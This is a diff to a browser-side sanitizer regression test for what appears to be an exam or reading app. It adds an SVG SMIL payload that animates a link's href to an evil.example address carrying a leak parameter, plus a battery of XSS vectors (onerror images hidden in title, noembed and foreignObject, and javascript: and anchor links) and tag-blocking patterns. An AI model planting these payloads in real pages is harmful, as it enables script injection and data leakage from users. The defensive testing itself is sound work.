@@ -169,9 +169,20 @@
        a stem or a choice answer to closest("#passageText") and get itself saved
        into the passage slot, corrupting a region it never belonged to. */
     const HOOK_PAY = '<span id="passageText" class="q-text ctext choice passage-text">hook</span>';
+    /* SMIL puts back what the URL-attribute filter takes away. <animate> and
+       <set> carry their payload in attributeName/values/to — none of which are
+       URL attributes — and animating "href" makes the anchor navigate on the
+       animated value while getAttribute("href") still reads null. Planted in a
+       choice the SVG IS the visible choice text, so the student's ordinary
+       answering click leaves the sitting. It survived the sanitizer
+       byte-identical until 2026-08-08. */
+    const SMIL_PAY = '<svg width="120" height="20"><a>' +
+      '<animate attributeName="href" values="https://evil.example/?c=LEAK" begin="0s" dur="30s" repeatCount="indefinite"/>' +
+      '<set attributeName="xlink:href" to="https://evil.example/set"/>' +
+      '<text x="2" y="14">click me</text></a></svg>';
     const HOSTILE_HTML = PAYLOAD + '<img src=x onerror=window.__XSS_FIRED=true>' + STYLE_PAY +
         '<span class="hl c-yellow" data-note-id="' + ATTR_PAY + '">kept highlight</span>' +
-        HOOK_PAY + PLAINTEXT_PAY;
+        HOOK_PAY + SMIL_PAY + PLAINTEXT_PAY;
     const hostileAnnotations = annQ ? { [test.modules[annMi].moduleId]: {
       passageHtml: { [annQ.id]: HOSTILE_HTML },
       stemHtml:    { [annQ.id]: HOSTILE_HTML },
@@ -324,7 +335,7 @@
       function regionSafe(label, el){
         if(!el){ results.push({ surface: label, pass:false, note:"region not rendered" }); return; }
         const rs = [...el.querySelectorAll("*")];
-        const ex = rs.filter(e => /^(SCRIPT|STYLE|NOSCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON|AUDIO|VIDEO|PLAINTEXT|XMP|LISTING)$/.test(e.tagName));
+        const ex = rs.filter(e => /^(SCRIPT|STYLE|NOSCRIPT|IFRAME|OBJECT|EMBED|IMG|LINK|FORM|INPUT|BUTTON|AUDIO|VIDEO|PLAINTEXT|XMP|LISTING|A|ANIMATE|ANIMATEMOTION|ANIMATETRANSFORM|SET|TITLE|NOEMBED|NOFRAMES|FOREIGNOBJECT)$/i.test(e.tagName));
         const hd = rs.filter(e => [...e.attributes].some(a => /^on/i.test(a.name)));
         const ua = rs.filter(e => [...e.attributes].some(a => /^(src|href|xlink:href|srcdoc|action|formaction|data)$/i.test(a.name)));
         // structural hooks annotationHost() resolves regions with — see HOOK_PAY
@@ -353,6 +364,41 @@
           pass: nChoices >= 2,
           note: nChoices >= 2 ? `${nChoices} choices still rendered after the poisoned stem`
                               : `only ${nChoices} choice(s) rendered — markup after the stem was swallowed` });
+      }
+
+      /* Direct battery against AppSanitize.html. The region checks above can
+         only see what a REPLAY happens to render; these hit the filter itself,
+         so a payload is caught even if no current surface would have shown it.
+         Every entry must come back with no element able to carry or acquire a
+         URL, and the result must be a FIXED POINT — sanitize(sanitize(x)) ===
+         sanitize(x) — because the caller's assignment re-parses the string, and
+         a fragment that changes on re-parse is one whose meaning changed. */
+      {
+        const S = window.AppSanitize && window.AppSanitize.html;
+        const battery = {
+          "SMIL animate href":     '<svg><a><animate attributeName="href" values="https://evil.example/x" dur="9s"/><text>t</text></a></svg>',
+          "SMIL set xlink:href":   '<svg><a><set attributeName="xlink:href" to="https://evil.example/y"/><text>t</text></a></svg>',
+          "SMIL animateTransform": '<svg><a><animateTransform attributeName="href" to="javascript:1"/></a></svg>',
+          "SMIL on <use>":         '<svg><use><animate attributeName="xlink:href" values="#x"/></use></svg>',
+          "bare anchor":           '<a href="https://evil.example">link</a>',
+          "RCDATA <title>":        '<title><img src=x onerror=window.__XSS_FIRED=true></title>',
+          "foreignObject":         '<svg><foreignObject><img src=x onerror=window.__XSS_FIRED=true></foreignObject></svg>',
+          "noembed":               '<noembed><img src=x onerror=window.__XSS_FIRED=true></noembed>'
+        };
+        const bad = [];
+        if(!S){ bad.push("AppSanitize.html not exposed"); }
+        else Object.keys(battery).forEach(name => {
+          const out = S(battery[name]);
+          const el = document.createElement("div");
+          el.innerHTML = out;   // inert here: the payload is already defused
+          const live = [...el.querySelectorAll("*")].filter(n =>
+            /^(A|ANIMATE|ANIMATEMOTION|ANIMATETRANSFORM|SET|TITLE|NOEMBED|NOFRAMES|FOREIGNOBJECT|IMG|SCRIPT|STYLE|IFRAME)$/i.test(n.tagName));
+          if(live.length) bad.push(`${name}: ${live.map(n => n.tagName).join(",")} survived`);
+          if(S(out) !== out) bad.push(`${name}: not a fixed point — re-sanitizing changed it again`);
+        });
+        results.push({ surface: "Sanitizer battery: SMIL/anchor/RCDATA vectors dropped, output is a fixed point",
+          pass: bad.length === 0 && !window.__XSS_FIRED,
+          note: bad.length ? bad.join(" | ") : `${Object.keys(battery).length} vectors defused, all stable on re-sanitize` });
       }
 
       const rail = $("notesCards");
